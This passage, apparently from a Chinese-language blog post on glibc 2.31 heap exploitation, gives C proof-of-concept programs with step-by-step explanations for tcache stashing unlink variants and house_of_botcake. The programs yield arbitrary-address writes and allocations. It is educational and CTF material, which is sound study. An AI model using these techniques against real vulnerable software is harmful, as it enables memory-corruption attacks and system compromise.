victim&#x27;s value: 0x%lx\n&quot;</span>, victim);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;	<br></code></pre></td></tr></table></figure>

<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426210920666.png"><span class="image-caption">image-20220426210920666</span></p>
<p>目标地址0x555555558050，值为0。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426211028509.png"><span class="image-caption">image-20220426211028509</span></p>
<p>释放六个大小为0x60的堆块进入 tcache bin 里面。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426211149437.png"><span class="image-caption">image-20220426211149437</span></p>
<p>申请两个堆块，一个大于tcache[max]，另一个防止合并。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426211255158.png"><span class="image-caption">image-20220426211255158</span></p>
<p>释放大堆块进入到 unsorted bin 中，再申请一个计算好的堆块，让大堆块进行分割，剩下的大小与之前申请的堆块大小一致，再申请一个更大的堆块，让这个堆块进入到 small bin 中。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426211447839.png"><span class="image-caption">image-20220426211447839</span></p>
<p>做一遍类似的操作，但是这次阻止合并堆块的大小要大于定好的堆块大小，防止 small chunk 进行分配。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426211614394.png"><span class="image-caption">image-20220426211614394</span></p>
<p>一样的操作，再让一个堆块进入到同样size序列的 small bin 中。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426211858473.png"><span class="image-caption">image-20220426211858473</span></p>
<p>修改后进入 small bin 的那个堆块的 bk 指针为 目标地址 - 0x10。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426212131959.png"><span class="image-caption">image-20220426212131959</span></p>
<p>最后使用 calloc 申请一个同等 size 的堆块，即可在目标地址上写入一个大数。</p>
<h3 id="tcache-stashing-unlink利用总结"><a href="#tcache-stashing-unlink利用总结" class="headerlink" title="tcache_stashing_unlink利用总结"></a>tcache_stashing_unlink利用总结</h3><p>效果：往任意地址里写入一个 0x7f 头的大数，unsorted bin attack 的替代手法。</p>
<ul>
<li>选定一个 n = size，释放六个大小为 n 的堆块进入到 tcache bin</li>
<li>精心准备让一个堆块进入到 unsorted bin 中，同时使得这个堆块的 size 变为 n，再让其进入到 small bin 中。</li>
<li>再重复构造一个同样 size 为 n 的堆块进入 small bin 后，修改该堆块的 bk 指针为 目标地址-0x10</li>
<li>使用 calloc 申请一个 size 为 n 的堆块</li>
</ul>
<p>注：被修改 bk 指针的堆块，fd 是不能被改变的，所以需要获取到堆地址</p>
<h2 id="tcache-stashing-unlink-1"><a href="#tcache-stashing-unlink-1" class="headerlink" title="tcache_stashing_unlink+"></a><strong>tcache_stashing_unlink+</strong></h2><p>poc如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>&#123;<br>	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>	setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<br><br>	<span class="hljs-keyword">char</span> *t1;<br>	<span class="hljs-keyword">char</span> *s1, *s2, *pad;<br>	<span class="hljs-keyword">char</span> *tmp;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You can use this technique to get a tcache chunk to arbitrary address\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1. need to know heap address and the victim address that you need to attack\n&quot;</span>);<br><br>	tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;victim&#x27;s address: %p, victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, <br>		&amp;victim, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap address: %p\n&quot;</span>, tmp<span class="hljs-number">-0x260</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n2. change victim&#x27;s data, make victim[1] = &amp;victim, or other address to writable address\n&quot;</span>);<br>	victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, <br>		victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n3. choose a stable size and free five identical size chunks to tcache_entry list\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Here, I choose the size 0x60\n&quot;</span>);<br>	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++)&#123;<br>		t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<br>		<span class="hljs-built_in">free</span>(t1);<br>	&#125;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, <br>		t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;</span>);<br><br>	s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;</span>, s1);<br>	pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;</span>, s1);<br>	<span class="hljs-built_in">free</span>(s1);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free chunk %p to unsortedbin\n&quot;</span>, s1);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;</span>);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s1+<span class="hljs-number">0x3c0</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;</span>);<br>	s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>	pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>	<span class="hljs-built_in">free</span>(s2);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s2+<span class="hljs-number">0x3c0</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;</span>, s2+<span class="hljs-number">0x3c0</span>, s1+<span class="hljs-number">0x3c0</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n5. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;</span>, s2+<span class="hljs-number">0x3c0</span>, (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>);<br>	*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;</span>);<br><br>	<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, <br>		&amp;victim, s2+<span class="hljs-number">0x3d0</span>, t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Apply to tcache_entry[4], you can get a pointer to victim address\n&quot;</span>);<br>	<br>	<span class="hljs-keyword">uint64_t</span> *r = (<span class="hljs-keyword">uint64_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);<br>	r[<span class="hljs-number">0</span>] = <span class="hljs-number">0xaa</span>;<br>	r[<span class="hljs-number">1</span>] = <span class="hljs-number">0xbb</span>;<br>	r[<span class="hljs-number">2</span>] = <span class="hljs-number">0xcc</span>;<br>	r[<span class="hljs-number">3</span>] = <span class="hljs-number">0xdd</span>;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, <br>		victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<br>	<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426221322819.png"><span class="image-caption">image-20220426221322819</span></p>
<p>目标地址为0x555555558060，值为0。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426221553008.png"><span class="image-caption">image-20220426221553008</span></p>
<p>在 victim[1] 写入 victim 的地址。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426221722290.png"><span class="image-caption">image-20220426221722290</span></p>
<p>释放五个size为0x60的堆块进入tcache bin中。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426221846227.png"><span class="image-caption">image-20220426221846227</span></p>
<p>跟 tcache_stashing_unlink 中的一样的做法，让一个size也为0x60的堆块进入到small bin中。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426222049041.png"><span class="image-caption">image-20220426222049041</span></p>
<p>再制造一个size为0x60的堆块进入到smallbin中。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426222256149.png"><span class="image-caption">image-20220426222256149</span></p>
<p>把后进入smallbin的堆块bk修改为&amp;victim-0x10，fd保持不变。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426222527079.png"><span class="image-caption">image-20220426222527079</span></p>
<p>再使用calloc申请size为0x60的堆块，此时victim也将被放入到tcache中。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20220426222958162.png"><span class="image-caption">image-20220426222958162</span></p>
<p>此时可以把victim申请出来，获得任意写的能力。</p>
<h3 id="tcache-stashing-unlink-利用总结"><a href="#tcache-stashing-unlink-利用总结" class="headerlink" title="tcache_stashing_unlink+利用总结"></a>tcache_stashing_unlink+利用总结</h3><p>将一个任意地址当做堆块放入到 tcache 中。</p>
<ul>
<li>选定一个 n = size，释放五个大小为 n 的堆块进入到 tcache bin</li>
<li>精心准备让一个堆块进入到 unsorted bin 中，同时修改这个堆块的 size 变为 n，再让其进入到 small bin 中。</li>
<li>再重复构造一个同样 size 为 n 的堆块进入 small bin 后，修改该堆块的 bk 指针为 &amp;target - 0x10</li>
<li>在 &amp;target + 8 的位置要存放有任意一个可写的地址，满足检查。</li>
<li>使用 calloc 申请一个 size 为 n 的堆块</li>
<li>此时 target 将被放入 tcache 中。</li>
</ul>
<p>注：被修改 bk 指针的堆块，fd 是不能被改变的，所以需要获取到堆地址。</p>
<h2 id="tcache-stash-unlink-attack"><a href="#tcache-stash-unlink-attack" class="headerlink" title="tcache stash unlink attack++"></a>tcache stash unlink attack++</h2><p>这个方法与tcache_stashing_unlink+几乎相同。</p>
<p>poc如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim2 = <span class="hljs-number">0</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>&#123;<br>	setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>	setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<br><br>	<span class="hljs-keyword">char</span> *t1;<br>	<span class="hljs-keyword">char</span> *s1, *s2, *pad;<br>	<span class="hljs-keyword">char</span> *tmp;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\n&quot;</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\n&quot;</span>);<br><br>	tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;victim&#x27;s address: %p, victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, <br>		&amp;victim, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;victim2&#x27;s address: %p, victim2&#x27;s value: 0x%lx\n&quot;</span>,<br>		&amp;victim2, victim2);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap address: %p\n&quot;</span>, tmp<span class="hljs-number">-0x260</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n2. change victim&#x27;s data, make victim[1] = &amp;victim2-0x10\n&quot;</span>);<br>	victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim2)<span class="hljs-number">-0x10</span>;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, <br>		victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<br><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n3. choose a stable size and free five identical size chunks to tcache_entry list\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Here, I choose the size 0x60\n&quot;</span>);<br>	<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++)&#123;<br>		t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<br>		<span class="hljs-built_in">free</span>(t1);<br>	&#125;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, <br>		t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;</span>);<br><br>	s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;</span>, s1);<br>	pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;</span>, s1);<br>	<span class="hljs-built_in">free</span>(s1);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free chunk %p to unsortedbin\n&quot;</span>, s1);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;</span>);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s1+<span class="hljs-number">0x3c0</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;</span>);<br>	s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>	pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>	<span class="hljs-built_in">free</span>(s2);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<br>	<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s2+<span class="hljs-number">0x3c0</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;</span>, s2+<span class="hljs-number">0x3c0</span>, s1+<span class="hljs-number">0x3c0</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n5. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;</span>, s2+<span class="hljs-number">0x3c0</span>, (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>);<br>	*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;</span>);<br><br>	<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, <br>		&amp;victim, s2+<span class="hljs-number">0x3d0</span>, t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Apply to tcache_entry[4], you can get a pointer to victim address\n&quot;</span>);<br>	<br>	<span class="hljs-keyword">uint64_t</span> *r = (<span class="hljs-keyword">uint64_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);<br>	r[<span class="hljs-number">0</span>] = <span class="hljs-number">0xaa</span>;<br>	r[<span class="hljs-number">1</span>] = <span class="hljs-number">0xbb</span>;<br>	r[<span class="hljs-number">2</span>] = <span class="hljs-number">0xcc</span>;<br>	r[<span class="hljs-number">3</span>] = <span class="hljs-number">0xdd</span>;<br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n&quot;</span>, <br>		victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;victim2&#x27;s value: 0x%lx\n&quot;</span>,<br>		victim2);<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;	<br></code></pre></td></tr></table></figure>

<p>该手法就是第一种和第二种的叠加手法，就不细说了，直接总结手法。</p>
<h3 id="tcache-stashing-unlink-利用总结-1"><a href="#tcache-stashing-unlink-利用总结-1" class="headerlink" title="tcache_stashing_unlink++利用总结"></a>tcache_stashing_unlink++利用总结</h3><p>将一个任意地址当做堆块放入到 tcache 中，同时可以往一个任意地址写入一个 libc 地址。</p>
<ul>
<li>选定一个 n = size，释放五个大小为 n 的堆块进入到 tcache bin；</li>
<li>精心准备让一个堆块进入到 unsorted bin 中，同时使得这个堆块的 size 变为 n，再让其进入到 small bin 中；</li>
<li>再重复构造一个同样 size 为 n 的堆块进入 small bin 后，修改该堆块的 bk 指针为 &amp;target1 - 0x10；</li>
<li>在 &amp;target1 + 8 的位置填写 &amp;target2 - 0x10；</li>
<li>使用 calloc 申请一个 size 为 n 的堆块；</li>
<li>此时 target1 将被放入 tcache 中，同时对 target2 写入一个 libc 地址。</li>
</ul>
<p>注：被修改 bk 指针的堆块，fd 是不能被改变的，所以需要获取到堆地址。</p>
<h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a><strong>house_of_botcake</strong></h2><p>poc：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Inspired by how2heap\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You can use this technique to create chunk overlap, only relies on double free.\n&quot;</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n1. Alloc 7 chunks to fill up tcache list\n&quot;</span>);<br><br>    <span class="hljs-keyword">char</span> *x[<span class="hljs-number">7</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;<br>        x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n2. Prepare two chunk with the same size as befor, for consolidation in unsortedbin\n&quot;</span>);<br>    <br>    <span class="hljs-keyword">char</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-keyword">char</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Padding chunk to prevent consolidation\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n3. Fill in the tcache list and consolidation two prepared chunk in unsortedbin\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;<br>        <span class="hljs-built_in">free</span>(x[i]);<br>    &#125;   <br><br>    <span class="hljs-built_in">free</span>(b);<br>    <span class="hljs-built_in">free</span>(a);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n4. Get a chunk from tcache list and make chunk overlap\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>    <span class="hljs-built_in">free</span>(b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, chunk %p will be freed into tcache list\n&quot;</span>, b);    <br>    <br>    <span class="hljs-keyword">char</span>* res = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x130</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size is not matched with tcache list, so get chunk from unsortedbin, which makes chunk overlap\n&quot;</span>);<br>    <br>    *(<span class="hljs-keyword">uint64_t</span>*)(res+<span class="hljs-number">0x110</span>) = (<span 